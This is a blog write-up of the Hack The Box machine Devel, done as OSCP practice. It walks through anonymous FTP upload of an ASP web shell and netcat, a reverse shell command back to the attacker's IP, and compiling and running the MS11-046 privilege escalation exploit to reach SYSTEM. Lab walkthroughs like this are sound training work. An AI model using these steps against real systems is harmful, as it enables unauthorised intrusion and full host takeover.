---
title: Write-up Devel on HTB
author: eMVee
date: 2023-04-07 19:00:00 +0800
categories: [CTF, HTB]
tags: [HTB, OSCP, PNPT, ftp anonymous, IIS, CVE-2011-1249, MS11-046]
render_with_liquid: false
---

While preparing for OSCP it is wise to practice as much as possible. One of the boxes I did for preperation for OSCP is Devel on HTB. This is a relatively simple machine that demonstrates the security risks associated with some default program configurations. 

## Getting started
First, let's take the following steps:

- Create a working directory to save necessary data.
- Check our own IP address.
- Assign the IP address of the target to a variable.

This will prepare our environment for the upcoming tasks.
```bash
┌──(emvee㉿kali)-[~]
└─$ cd Documents/HTB/        

┌──(emvee㉿kali)-[~/Documents/HTB]
└─$ mcd Devel

┌──(emvee㉿kali)-[~/Documents/HTB/Devel]
└─$ myip     

    inet 127.0.0.1
    inet 10.0.2.15
    inet 10.10.14.114
```
After booting the machine an IP address has been assigned to Devel. This IP address can be assigned to a variable in the terminal.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Devel]
└─$ ip=10.129.253.47
```

## Enumeration
We are ready to rumble and get started with enumeration on the target. Let's first run a ping request to see if the machine is answering a ping request.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Devel]
└─$ ping $ip -c 3
PING 10.129.253.47 (10.129.253.47) 56(84) bytes of data.
64 bytes from 10.129.253.47: icmp_seq=1 ttl=127 time=61.9 ms
64 bytes from 10.129.253.47: icmp_seq=2 ttl=127 time=78.2 ms
64 bytes from 10.129.253.47: icmp_seq=3 ttl=127 time=68.9 ms

--- 10.129.253.47 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2024ms
rtt min/avg/max/mdev = 61.913/69.681/78.219/6.679 ms

```
Based on the `ttl` value we can indicate that this machine is probably running on a Windows Operating System.
Next we can run a quick port scan with nmap to identify open ports.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Devel]
└─$ nmap -T4 -p- $ip -Pn          
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-04 17:04 CEST
Nmap scan report for 10.129.253.47
Host is up (0.054s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 134.28 seconds

```
Well nmap discovered two open ports, let's add them to our notes.
* Port 21
	* FTP
* Port 80
	* HTTP

Let's run a quick enumeration scan with whatweb to see some technologies used by the webservice.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Devel]
└─$ whatweb http://$ip
http://10.129.253.47 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/7.5], IP[10.129.253.47], Microsoft-IIS[7.5][Under Construction], Title[IIS7], X-Powered-By[ASP.NET]

```
It looks like IIS 7.5 is being used by the target and the ASP.NET technology.
Based on this information and the information from Microsoft the target is probably running on Windows 7 or Windows 2008 server.
[https://learn.microsoft.com/en-us/lifecycle/products/internet-information-services-iis](https://learn.microsoft.com/en-us/lifecycle/products/internet-information-services-iis)

Now we should run an advancded port scan to identify some more information.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Devel]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip -Pn
[sudo] password for emvee: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-04 17:06 CEST
Nmap scan report for 10.129.253.47
Host is up (0.056s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   58.03 ms 10.10.14.1
2   62.19 ms 10.129.253.47

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 127.96 seconds

```
The nmap scan returned information about anonymous logon.
So let's check if we can upload files.
Before uploading file we need to copy the files what we would like to upload to our working directory.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Devel]
└─$ cp /usr/share/webshells/asp/cmd-asp-5.1.asp ./cmd.asp

┌──(emvee㉿kali)-[~/Documents/HTB/Devel]
└─$ cp /usr/share/windows-resources/binaries/nc.exe .

```
Now we can logon anonymous to the FTP service and try to upload our files.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Devel]
└─$ ftp $ip -a
Connected to 10.129.253.47.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||49160|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> bin
200 Type set to I.
ftp> put cmd.asp 
local: cmd.asp remote: cmd.asp
229 Entering Extended Passive Mode (|||49158|)
150 Opening BINARY mode data connection.
100% |***********************************************************************|  1181       11.61 MiB/s    00:00 ETA
226 Transfer complete.
1181 bytes sent in 00:00 (16.14 KiB/s)
ftp> put nc.exe 
local: nc.exe remote: nc.exe
229 Entering Extended Passive Mode (|||49159|)
125 Data connection already open; Transfer starting.
100% |***********************************************************************| 59392      559.03 KiB/s    00:00 ETA
226 Transfer complete.
59392 bytes sent in 00:00 (323.85 KiB/s)
ftp> exit
221 Goodbye.
             
```
The upload was successfully. No we should visit the website and our uploaded file.

![Image](/assets/img/WriteUp/HTB/Devel/Pasted image 20230404171700.png){: width="700" height="400" }

The website does load our file.
Let's find out where we are working in on the target with the command `echo %pwd%`

![Image](/assets/img/WriteUp/HTB/Devel/Pasted image 20230404171808.png){: width="700" height="400" }

It did not show the result as I did want to have. But it did show me that the command echo was executed. This gives us the opportunity to start a reverse shell from our target to our machine.

The command we should use to start our reverse shell looks like this:
```
C:\inetpub\wwwroot\nc.exe 10.10.14.114 53 -e cmd.exe
```

Before running the command we should start our netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Devel]
└─$ sudo nc -lvp 53
[sudo] password for emvee: 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53

```
The netcat listener is running.

## Initial access

Now we should enter the command and execute it in the website.
```
C:\inetpub\wwwroot\nc.exe 10.10.14.114 53 -e cmd.exe
```
Let's check the netcat listener to see if a connection has been established.
```
┌──(emvee㉿kali)-[~/Documents/HTB/Devel]
└─$ sudo nc -lvp 53
[sudo] password for emvee: 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
Ncat: Connection from 10.129.253.47.
Ncat: Connection from 10.129.253.47:49161.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>


```
We got a reverse shell working! Based on this piece of information`Microsoft Windows [Version 6.1.7600]`, we could identify the Windows Operating System as Windows 7 build 7600. Next we should find out who we are on the system and what privileges we have.
```
c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web

c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

c:\windows\system32\inetsrv>

```
Based on the privileges identified, this privilege: `SeImpersonatePrivilege` could be interesting to use to gain more privileges.
Let's run systeminfo first to get more information about the system.
```
c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ��
System Boot Time:          4/4/2023, 6:02:24 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.422 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.509 MB
Virtual Memory: In Use:    632 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 4
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.253.47
                                 [02]: fe80::fc7d:fa80:da7b:5c3a
                                 [03]: dead:beef::8815:9f26:3fd7:3dc1
                                 [04]: dead:beef::fc7d:fa80:da7b:5c3a

c:\windows\system32\inetsrv>

```
Using some [Google Fu to find an exploit for this Windows version](https://www.google.com/search?q=6.1.7600+n%252Fa+build+7600+exploit&) results in a hit to exploit-db. It has the EDB-ID : 40564
This exploit can be found with searchsploit as well and we can even copy it to our working directory by using the `-m` argument followed by the EDB-ID.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Devel]
└─$ searchsploit -m 40564                  
  Exploit: Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)
      URL: https://www.exploit-db.com/exploits/40564
     Path: /usr/share/exploitdb/exploits/windows_x86/local/40564.c
    Codes: CVE-2011-1249, MS11-046
 Verified: True
File Type: C source, ASCII text
Copied to: /home/emvee/Documents/HTB/Devel/40564.c

```
We should check the source code for what the exploit is doing.

![Image](/assets/img/WriteUp/HTB/Devel/Pasted image 20230404174254.png){: width="700" height="400" }

It looks like we should compile the exploit so it can be run on the target.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Devel]
└─$ i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32 
```
Now we should tranfser the exploit to the target. The target does have a FTP service running where we can upload files. This will safe us some time.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Devel]
└─$ ftp $ip -a
Connected to 10.129.253.47.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
230 User logged in.
Remote system type is Windows_NT.
ftp> bin
200 Type set to I.
ftp> put MS11-046.exe
local: MS11-046.exe remote: MS11-046.exe
229 Entering Extended Passive Mode (|||49162|)
125 Data connection already open; Transfer starting.
100% |***********************************************************************|   234 KiB  892.63 KiB/s    00:00 ETA
226 Transfer complete.
240005 bytes sent in 00:01 (144.29 KiB/s)
ftp> 

```

## Privilege escalation
After uploading the file to the target we should execute the exploit. To do this I like to change the working directory to the place where we have uploaded the exploit.
```
c:\windows\system32\inetsrv>cd c:\
cd c:\

c:\>cd C:\inetpub\wwwroot\
cd C:\inetpub\wwwroot\

C:\inetpub\wwwroot>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of C:\inetpub\wwwroot

04/04/2023  06:43 ��    <DIR>          .
04/04/2023  06:43 ��    <DIR>          ..
18/03/2017  02:06 ��    <DIR>          aspnet_client
04/04/2023  06:13 ��             1.181 cmd.asp
17/03/2017  05:37 ��               689 iisstart.htm
04/04/2023  06:44 ��           240.005 MS11-046.exe
04/04/2023  06:15 ��            59.392 nc.exe
04/04/2023  06:21 ��                 0 radB37DF.tmp
17/03/2017  05:37 ��           184.946 welcome.png
               6 File(s)        486.213 bytes
               3 Dir(s)   4.694.843.392 bytes free

```
Now we can run our exploit to gain more privileges.
```
C:\inetpub\wwwroot>MS11-046.exe
MS11-046.exe

c:\Windows\System32>whoami
whoami
nt authority\system
```
We are `nt authority\system` on the target, this means we have pwned the system. Now we should capture the flags and some proof of the target.
```

c:\Windows\System32>hostname
hostname
devel

c:\Windows\System32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection 4:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::fc7d:fa80:da7b:5c3a
   Temporary IPv6 Address. . . . . . : dead:beef::8815:9f26:3fd7:3dc1
   Link-local IPv6 Address . . . . . : fe80::fc7d:fa80:da7b:5c3a%19
   IPv4 Address. . . . . . . . . . . : 10.129.253.47
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:7437%19
                                       10.129.0.1

Tunnel adapter isatap..htb:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : .htb

Tunnel adapter Local Area Connection* 9:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

c:\Windows\System32>

```
Last step, capture the flags!
```
c:\Windows\System32>cd c:\
cd c:\

c:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of c:\

11/06/2009  12:42 ��                24 autoexec.bat
11/06/2009  12:42 ��                10 config.sys
17/03/2017  07:33 ��    <DIR>          inetpub
14/07/2009  05:37 ��    <DIR>          PerfLogs
13/12/2020  01:59 ��    <DIR>          Program Files
18/03/2017  02:16 ��    <DIR>          Users
11/02/2022  05:03 ��    <DIR>          Windows
               2 File(s)             34 bytes
               5 Dir(s)   4.694.818.816 bytes free

c:\>cd users
cd users

c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of c:\Users

18/03/2017  02:16 ��    <DIR>          .
18/03/2017  02:16 ��    <DIR>          ..
18/03/2017  02:16 ��    <DIR>          Administrator
17/03/2017  05:17 ��    <DIR>          babis
18/03/2017  02:06 ��    <DIR>          Classic .NET AppPool
14/07/2009  10:20 ��    <DIR>          Public
               0 File(s)              0 bytes
               6 Dir(s)   4.694.818.816 bytes free

c:\Users>cd babis
cd babis

c:\Users\babis>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of c:\Users\babis

17/03/2017  05:17 ��    <DIR>          .
17/03/2017  05:17 ��    <DIR>          ..
17/03/2017  05:17 ��    <DIR>          Contacts
11/02/2022  04:54 ��    <DIR>          Desktop
17/03/2017  05:17 ��    <DIR>          Documents
17/03/2017  05:17 ��    <DIR>          Downloads
17/03/2017  05:17 ��    <DIR>          Favorites
17/03/2017  05:17 ��    <DIR>          Links
17/03/2017  05:17 ��    <DIR>          Music
17/03/2017  05:17 ��    <DIR>          Pictures
17/03/2017  05:17 ��    <DIR>          Saved Games
17/03/2017  05:17 ��    <DIR>          Searches
17/03/2017  05:17 ��    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)   4.694.818.816 bytes free

c:\Users\babis>cd Dekstop
cd Dekstop
The system cannot find the path specified.

c:\Users\babis>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of c:\Users\babis

17/03/2017  05:17 ��    <DIR>          .
17/03/2017  05:17 ��    <DIR>          ..
17/03/2017  05:17 ��    <DIR>          Contacts
11/02/2022  04:54 ��    <DIR>          Desktop
17/03/2017  05:17 ��    <DIR>          Documents
17/03/2017  05:17 ��    <DIR>          Downloads
17/03/2017  05:17 ��    <DIR>          Favorites
17/03/2017  05:17 ��    <DIR>          Links
17/03/2017  05:17 ��    <DIR>          Music
17/03/2017  05:17 ��    <DIR>          Pictures
17/03/2017  05:17 ��    <DIR>          Saved Games
17/03/2017  05:17 ��    <DIR>          Searches
17/03/2017  05:17 ��    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)   4.694.818.816 bytes free

c:\Users\babis>cd desktop
cd desktop

c:\Users\babis\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of c:\Users\babis\Desktop

11/02/2022  04:54 ��    <DIR>          .
11/02/2022  04:54 ��    <DIR>          ..
04/04/2023  06:03 ��                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   4.694.818.816 bytes free

c:\Users\babis\Desktop>type user.txt
type user.txt
< HERE IS THE USER FLAG>>

c:\Users\babis\Desktop>type c:\users\administrator\desktop\root.txt
type c:\users\administrator\desktop\root.txt
< HERE IS THE ROOT FLAG>>

c:\Users\babis\Desktop>

```